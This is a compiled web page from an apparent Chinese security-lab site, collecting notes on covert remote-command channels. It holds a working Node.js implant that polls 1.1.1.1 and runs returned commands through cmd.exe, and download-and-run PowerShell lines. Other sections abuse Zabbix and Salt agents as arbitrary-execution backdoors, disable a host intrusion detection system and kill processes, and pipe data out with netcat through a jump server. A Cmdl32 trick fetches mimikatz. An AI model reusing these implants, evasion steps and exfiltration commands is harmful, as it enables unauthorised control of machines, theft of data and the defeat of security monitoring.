import{_ as n}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,f as i,o as e}from"./app-ebv6G4Fp.js";const l={};function p(d,s){return e(),a("div",null,[...s[0]||(s[0]=[i(`<h1 id="hcmd" tabindex="-1"><a class="header-anchor" href="#hcmd"><span>HCmd</span></a></h1><ul><li>Node 程序远程调试</li><li>将PowerShell脚本转换为EXE</li><li>物联网协议 mqtt 远程命令通道</li></ul><h3 id="杀狼" tabindex="-1"><a class="header-anchor" href="#杀狼"><span>杀狼</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>操作：</span></span>
<span class="line"><span>1.先断开网络，使其不能和外部通信。</span></span>
<span class="line"><span>sudo ifconfig ethX dwon 关闭网卡</span></span>
<span class="line"><span>sudo /etc/init.d/networking stop 关闭网络</span></span>
<span class="line"><span></span></span>
<span class="line"><span>2.修改运行权限 或 移除hids目录</span></span>
<span class="line"><span>Mv hids</span></span>
<span class="line"><span>Chmod 000 hids</span></span>
<span class="line"><span></span></span>
<span class="line"><span>3.重新启动系统，hids环境被破坏失去能力。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="process-stop-杀死进程" tabindex="-1"><a class="header-anchor" href="#process-stop-杀死进程"><span>Process Stop 杀死进程</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#include &lt;stdio.h&gt;</span></span>
<span class="line"><span>#include &lt;signal.h&gt;</span></span>
<span class="line"><span>#include &lt;sys/reboot.h&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>int main()</span></span>
<span class="line"><span>{</span></span>
<span class="line"><span>	kill(1887, 19);</span></span>
<span class="line"><span>	kill(1888, 19);</span></span>
<span class="line"><span>	kill(1890, 19);</span></span>
<span class="line"><span>	kill(1892, 19);</span></span>
<span class="line"><span>	kill(1894, 19);</span></span>
<span class="line"><span>	kill(1896, 19);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>	int move_ok = 0;</span></span>
<span class="line"><span>	move_ok = rename(&quot;/opt/apps/soft&quot;, &quot;/opt/apps/soft-backup&quot;);</span></span>
<span class="line"><span>	if (move_ok == 0)</span></span>
<span class="line"><span>	{</span></span>
<span class="line"><span>		sync();</span></span>
<span class="line"><span>		// reboot</span></span>
<span class="line"><span>		reboot(0X01234567);</span></span>
<span class="line"><span>	}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>	return 0;</span></span>
<span class="line"><span>}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="jenkins-方案" tabindex="-1"><a class="header-anchor" href="#jenkins-方案"><span>Jenkins 方案</span></a></h1><ul><li>Jenkins 里面很多工具，都是自动化的，应该可以用于远程。</li></ul><p><a href="http://jenkins-ci.org/" target="_blank" rel="noopener noreferrer">Jenkins</a> continuous integration server.</p><h1 id="zabbix-方案" tabindex="-1"><a class="header-anchor" href="#zabbix-方案"><span>Zabbix 方案</span></a></h1><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># Version 5.0 LTS</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Server Test</span></span>
<span class="line"><span>http://1.1.1.1/zabbix/</span></span>
<span class="line"><span>Admin / zabbix</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Server install</span></span>
<span class="line"><span>apt install mysql-server</span></span>
<span class="line"><span>next step: https://www.zabbix.com/download?zabbix=5.0&amp;os_distribution=ubuntu&amp;os_version=18.04_bionic&amp;db=mysql&amp;ws=apache</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Server config</span></span>
<span class="line"><span>/etc/zabbix/zabbix_server.conf</span></span>
<span class="line"><span>ListenPort=8080</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Agent Download</span></span>
<span class="line"><span>https://www.zabbix.com/download_agents</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Agent install service</span></span>
<span class="line"><span>zabbix_agentd.exe -c zabbix_agentd.conf -i</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Agent cmd run</span></span>
<span class="line"><span>&quot;C:\\Users\\Admin\\Desktop\\Age\\zabbix_agentd.exe&quot; -f --config &quot;C:\\Users\\Admin\\Desktop\\Age\\zabbix_agentd.conf&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Agent config</span></span>
<span class="line"><span>#LogFile=C:\\Users\\Admin\\Desktop\\Age\\zabbix_agentd.log</span></span>
<span class="line"><span>#Server=1.1.1.1</span></span>
<span class="line"><span>#Hostname=Win0</span></span>
<span class="line"><span>ServerActive=1.1.1.1:8080</span></span>
<span class="line"><span>LogType=system</span></span>
<span class="line"><span>StartAgents=0</span></span>
<span class="line"><span>UserParameter=exec[*],powershell.exe &quot;$1&quot;</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span># Link</span></span>
<span class="line"><span>https://toutiao.io/posts/twbhdk/preview</span></span>
<span class="line"><span>Zabbix agent on Microsoft Windows</span></span>
<span class="line"><span>https://www.zabbix.com/documentation/current/manual/appendix/install/windows_agent</span></span>
<span class="line"><span>User parameters</span></span>
<span class="line"><span>https://www.zabbix.com/documentation/current/manual/config/items/userparameters</span></span>
<span class="line"><span>Host item</span></span>
<span class="line"><span>https://www.zabbix.com/documentation/4.0/zh/manual/config/items/item</span></span>
<span class="line"><span>zabbix 5 自动注册功能</span></span>
<span class="line"><span></span></span>
<span class="line"><span>CVE-2020-11800 Zabbix远程代码执行漏洞</span></span>
<span class="line"><span>Zabbix 3.0.x~3.0.30</span></span>
<span class="line"><span>https://www.zabbix.com/cn/download?zabbix=3.0</span></span>
<span class="line"><span>https://xz.aliyun.com/t/8991</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>CVE</span></span>
<span class="line"><span>https://www.cvedetails.com/vulnerability-list/vendor_id-5667/Zabbix.html</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>Linux script</span></span>
<span class="line"><span>wget  https://cdn.zabbix.com/zabbix/binaries/stable/5.0/5.0.17/zabbix_agent-5.0.17-linux-3.0-amd64-static.tar.gz</span></span>
<span class="line"><span>tar xzvf zabbix_agent-5.0.17-linux-3.0-amd64-static.tar.gz</span></span>
<span class="line"><span>cat &gt; conf/zabbix_agentd.conf &lt;&lt;&#39;EOF&#39;</span></span>
<span class="line"><span>ServerActive=1.1.1.1:8080</span></span>
<span class="line"><span>LogType=system</span></span>
<span class="line"><span>StartAgents=0</span></span>
<span class="line"><span>UserParameter=exec[*],/bin/sh -c &quot;$1&quot;</span></span>
<span class="line"><span>EOF</span></span>
<span class="line"><span>sudo -u nobody sbin/zabbix_agentd  -c conf/zabbix_agentd.conf</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="node-exe-方案" tabindex="-1"><a class="header-anchor" href="#node-exe-方案"><span>Node.exe 方案</span></a></h1><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
<span class="line"><span>合法签名程序搞定~ NodeJS压缩后20MB，只有一个exe文件包含完整运行环境。</span></span>
<span class="line"><span>看看有没有实战价值，没有找到Nodejs开源的C2</span></span>
<span class="line"><span>例子如下（Powershell）：</span></span>
<span class="line"><span>wget -uri http://1.1.1.1/node.zip -outfile $env:USERPROFILE\\Downloads\\node.zip</span></span>
<span class="line"><span>Expand-Archive -Path $env:USERPROFILE\\Downloads\\node.zip -DestinationPath $env:USERPROFILE\\Downloads\\</span></span>
<span class="line"><span>cd $env:USERPROFILE\\Downloads\\; curl http://1.1.1.1/cmd.js | Select -ExpandProperty Content | .\\node.exe</span></span>
<span class="line"><span></span></span>
<span class="line"><span>## todo 远程调试接口 作为后门</span></span>
<span class="line"><span>node inspect [options] [ script.js | host:port ] [arguments]</span></span>
<span class="line"><span>https://learnku.com/articles/21078</span></span>
<span class="line"><span>http://nodejs.cn/api/child_process.html</span></span>
<span class="line"><span></span></span>
<span class="line"><span>####### PC运行 ######</span></span>
<span class="line"><span># 1. 下载node.exe app.js</span></span>
<span class="line"><span>wget -uri http://1.1.1.1/node.zip -outfile  $env:USERPROFILE\\Downloads\\node.zip</span></span>
<span class="line"><span>wget -uri http://1.1.1.1/app.js -outfile  $env:USERPROFILE\\Downloads\\app.js</span></span>
<span class="line"><span>wget -uri http://1.1.1.1/cmd.txt -outfile  $env:USERPROFILE\\Downloads\\cmd.txt</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 2. 解压文件</span></span>
<span class="line"><span>Expand-Archive -Path .\\node.zip -DestinationPath $env:USERPROFILE\\Downloads\\</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 3. 创建服务 todo</span></span>
<span class="line"><span>add-service</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 4. 执行node.exe</span></span>
<span class="line"><span>$env:USERPROFILE\\Downloads\\node.exe app.js</span></span>
<span class="line"><span></span></span>
<span class="line"><span>合法签名程序搞定~ NodeJS压缩后20MB，只有一个exe文件包含完整运行环境。</span></span>
<span class="line"><span>看看有没有实战价值，没有找到Nodejs开源的C2</span></span>
<span class="line"><span>例子如下（Powershell）：</span></span>
<span class="line"><span>wget -uri http://1.1.1.1/node.zip -outfile $env:USERPROFILE\\Downloads\\node.zip</span></span>
<span class="line"><span>Expand-Archive -Path $env:USERPROFILE\\Downloads\\node.zip -DestinationPath $env:USERPROFILE\\Downloads\\</span></span>
<span class="line"><span>cd $env:USERPROFILE\\Downloads\\; curl http://1.1.1.1/cmd.js | Select -ExpandProperty Content | .\\node.exe</span></span>
<span class="line"><span></span></span>
<span class="line"><span>App.js</span></span>
<span class="line"><span></span></span>
<span class="line"><span>var http = require(&#39;http&#39;);</span></span>
<span class="line"><span>const { spawn } = require(&#39;node:child_process&#39;);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>function go_init() {</span></span>
<span class="line"><span>    // stuff you want to happen right away</span></span>
<span class="line"><span>    console.log(&#39;Welcome to My Console,&#39;);</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>function go_for() {</span></span>
<span class="line"><span>    // all the stuff you want to happen after that pause</span></span>
<span class="line"><span>	try{</span></span>
<span class="line"><span>		console.log(&#39;Blah blah blah blah extra-blah&#39;);</span></span>
<span class="line"><span>		go_get();</span></span>
<span class="line"><span>		setTimeout(go_for, 5000);</span></span>
<span class="line"><span>	}catch(e){</span></span>
<span class="line"><span>		// error captured</span></span>
<span class="line"><span>	}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>function go_get() {</span></span>
<span class="line"><span>	var options = {</span></span>
<span class="line"><span>	  host: &#39;1.1.1.1&#39;,</span></span>
<span class="line"><span>	  port: 80,</span></span>
<span class="line"><span>	  path: &#39;/cmd.txt&#39;</span></span>
<span class="line"><span>	};</span></span>
<span class="line"><span>    var body = &#39;&#39;;</span></span>
<span class="line"><span>	http.get(options, function(res) {</span></span>
<span class="line"><span>      body = &#39;&#39;;</span></span>
<span class="line"><span>	  res.on(&#39;data&#39;, function(chunk) {</span></span>
<span class="line"><span>		body += chunk;</span></span>
<span class="line"><span>	  });</span></span>
<span class="line"><span>	  res.on(&#39;end&#39;, function() {</span></span>
<span class="line"><span>		console.log(body);</span></span>
<span class="line"><span>		////////////////////////////////////</span></span>
<span class="line"><span>		go_cmd(body);</span></span>
<span class="line"><span>		//////////////////////////////////////	</span></span>
<span class="line"><span>	  });</span></span>
<span class="line"><span></span></span>
<span class="line"><span>	}).on(&#39;error&#39;, function(e) {</span></span>
<span class="line"><span>	  console.log(&quot;Got error: &quot; + e.message);</span></span>
<span class="line"><span>	}); </span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>function go_cmd(str) {</span></span>
<span class="line"><span></span></span>
<span class="line"><span>	var bat = spawn(&#39;cmd.exe&#39;, [&#39;/c&#39;, str]);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>	bat.stdout.on(&#39;data&#39;, (data) =&gt; {</span></span>
<span class="line"><span>	  console.log(data.toString());</span></span>
<span class="line"><span>	});</span></span>
<span class="line"><span></span></span>
<span class="line"><span>	bat.stderr.on(&#39;data&#39;, (data) =&gt; {</span></span>
<span class="line"><span>	  console.error(data.toString());</span></span>
<span class="line"><span>	});</span></span>
<span class="line"><span></span></span>
<span class="line"><span>	bat.on(&#39;exit&#39;, (code) =&gt; {</span></span>
<span class="line"><span>	  console.log(\`Child exited with code \${code}\`);</span></span>
<span class="line"><span>	});</span></span>
<span class="line"><span></span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>// call the first chunk of code right away</span></span>
<span class="line"><span>go_init();</span></span>
<span class="line"><span></span></span>
<span class="line"><span>// call the rest of the code and have it execute after 3 seconds</span></span>
<span class="line"><span>setTimeout(go_for, 3000);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="npm-pkg" tabindex="-1"><a class="header-anchor" href="#npm-pkg"><span>npm pkg</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>1. cd /var/log/nginx/</span></span>
<span class="line"><span></span></span>
<span class="line"><span>2. cat &gt; package.json &lt;&lt;-EOF  </span></span>
<span class="line"><span>{</span></span>
<span class="line"><span>  &quot;name&quot;: &quot;webpack&quot;,</span></span>
<span class="line"><span>  &quot;version&quot;: &quot;1.0.0&quot;,</span></span>
<span class="line"><span>  &quot;main&quot;: &quot;index.js&quot;,</span></span>
<span class="line"><span>  &quot;scripts&quot;: {</span></span>
<span class="line"><span>    &quot;start&quot;: &quot;echo &#39;test&#39;&quot;,</span></span>
<span class="line"><span>    &quot;stop&quot;: &quot;npm pack &amp;&amp; rm -rf package.json&quot;</span></span>
<span class="line"><span>  }</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span>EOF</span></span>
<span class="line"><span></span></span>
<span class="line"><span>3. sudo npm run start / stop</span></span>
<span class="line"><span></span></span>
<span class="line"><span>4. Download webpack-1.0.0.tgz</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="salt-方案" tabindex="-1"><a class="header-anchor" href="#salt-方案"><span>Salt 方案</span></a></h1><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># Master Install</span></span>
<span class="line"><span>## Link: https://docs.saltproject.io/en/latest/topics/installation/index.html#quick-install</span></span>
<span class="line"><span>ssh ubuntu18.04</span></span>
<span class="line"><span>## Install Script https://github.com/saltstack/salt-bootstrap#install-using-curl</span></span>
<span class="line"><span>## -M  Also install salt-master  </span></span>
<span class="line"><span>## -N  Do not install salt-minion</span></span>
<span class="line"><span>curl -o bootstrap-salt.sh -L https://bootstrap.saltproject.io</span></span>
<span class="line"><span>sudo sh bootstrap-salt.sh -P stable 3003.3 -M -N</span></span>
<span class="line"><span>## Config SALT</span></span>
<span class="line"><span>## Link: https://docs.saltproject.io/en/latest/ref/configuration/index.html</span></span>
<span class="line"><span>interface: 0.0.0.0</span></span>
<span class="line"><span>publish_port: 4505</span></span>
<span class="line"><span>ret_port: 4506</span></span>
<span class="line"><span></span></span>
<span class="line"><span>## Run SALT</span></span>
<span class="line"><span>salt-master</span></span>
<span class="line"><span>systemctl start salt-master</span></span>
<span class="line"><span></span></span>
<span class="line"><span># Win Client Install</span></span>
<span class="line"><span>## Link: https://repo.saltproject.io/#windows</span></span>
<span class="line"><span>https://mirrors.aliyun.com/saltstack/</span></span>
<span class="line"><span>wget Salt-Minion-3004-Py3-AMD64-Setup.exe</span></span>
<span class="line"><span>Salt-Minion-3004-Py3-AMD64-Setup.exe /S /master=8.130.162.66 /minion-name=sys0</span></span>
<span class="line"><span>## Config SALT</span></span>
<span class="line"><span>## Link: https://docs.saltproject.io/en/latest/ref/configuration/index.html</span></span>
<span class="line"><span>master: 10.0.0.1</span></span>
<span class="line"><span>publish_port: 4505</span></span>
<span class="line"><span>master_port: 4506</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h1 id="jumpserver-方案" tabindex="-1"><a class="header-anchor" href="#jumpserver-方案"><span>Jumpserver 方案</span></a></h1><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>方案一：编译定制版本netcat，代码中写死输入文件和输出IP</span></span>
<span class="line"><span>https://github.com/jiguangfuture/netcat</span></span>
<span class="line"><span></span></span>
<span class="line"><span>方案二：加密粘贴后，在解密文件</span></span>
<span class="line"><span>1. 事前准备数据传输脚本 test.py</span></span>
<span class="line"><span>#!/bin/bash</span></span>
<span class="line"><span>dd | gzip | base64 |nc 1.1.1.1 8080 </span></span>
<span class="line"><span></span></span>
<span class="line"><span>2. 加密并编码 这个脚本</span></span>
<span class="line"><span>gzip 密码 test.py ｜ base64</span></span>
<span class="line"><span></span></span>
<span class="line"><span>3. 通过堡垒机，拷贝base64文本，到目标系统，保存为test.py</span></span>
<span class="line"><span>#!/bin/bash</span></span>
<span class="line"><span>base64 ｜ gunzip 解密脚本（交互式输入密码）</span></span>
<span class="line"><span>sh test.py</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="cmdl32" tabindex="-1"><a class="header-anchor" href="#cmdl32"><span>Cmdl32</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>参考：</span></span>
<span class="line"><span>- https://elliotonsecurity.com/living-off-the-land-reverse-engineering-methodology-plus-tips-and-tricks-cmdl32-case-study/</span></span>
<span class="line"><span></span></span>
<span class="line"><span>C：\\Windows\\System32\\Cmdl32.exe”（由MS签名）</span></span>
<span class="line"><span></span></span>
<span class="line"><span>set tmp=%cd%</span></span>
<span class="line"><span>echo [connection Manager] &gt; settings.txt</span></span>
<span class="line"><span>echo CMSFile=settings.txt &gt;&gt; settings.txt</span></span>
<span class="line"><span>echo ServiceNamem=WindowsUpdate &gt;&gt; settings.txt</span></span>
<span class="line"><span>echo TunnelFile=settings.txt &gt;&gt; settings.txt</span></span>
<span class="line"><span>echo [Settings] &gt;&gt; settings.txt</span></span>
<span class="line"><span>echo UpdateUr=https://stderr.pl/mimi/mimikatz.exe &gt;&gt; settings.txt</span></span>
<span class="line"><span></span></span>
<span class="line"><span>cmd132 /vpn /lan %cd%\\settings.txt.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>icacls %cd% /deny %username%:(OI)(CI)(DE,DC)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,21)])])}const r=n(l,[["render",p]]),v=JSON.parse('{"path":"/tld/sec/HCmd.html","title":"HCmd","lang":"zh-CN","frontmatter":{"date":"2023-07-01T00:00:00.000Z","title":"HCmd","author":["SecCMD"],"description":"本页面聚焦于多种远HCmd管理方案\\n","categories":"安全工具","tags":["远程控制方案"],"head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"HCmd\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2023-07-01T00:00:00.000Z\\",\\"dateModified\\":\\"2025-09-12T17:24:12.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"SecCMD\\"}]}"],["meta",{"property":"og:url","content":"https://www.seccmd.net/tld/sec/HCmd.html"}],["meta",{"property":"og:site_name","content":"明剑实验室"}],["meta",{"property":"og:title","content":"HCmd"}],["meta",{"property":"og:description","content":"本页面聚焦于多种远HCmd管理方案\\n"}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-09-12T17:24:12.000Z"}],["meta",{"property":"article:author","content":"SecCMD"}],["meta",{"property":"article:tag","content":"远程控制方案"}],["meta",{"property":"article:published_time","content":"2023-07-01T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-09-12T17:24:12.000Z"}]]},"git":{"createdTime":1737552083000,"updatedTime":1757697852000,"contributors":[{"name":"seccmd","username":"seccmd","email":"79789833+seccmd@users.noreply.github.com","commits":2,"url":"https://github.com/seccmd"},{"name":"fireadm","username":"fireadm","email":"iwanwu@hotmail.com","commits":3,"url":"https://github.com/fireadm"}]},"readingTime":{"minutes":3.74,"words":1121},"filePathRelative":"tld/sec/HCmd.md"}');export{r as comp,v as data};
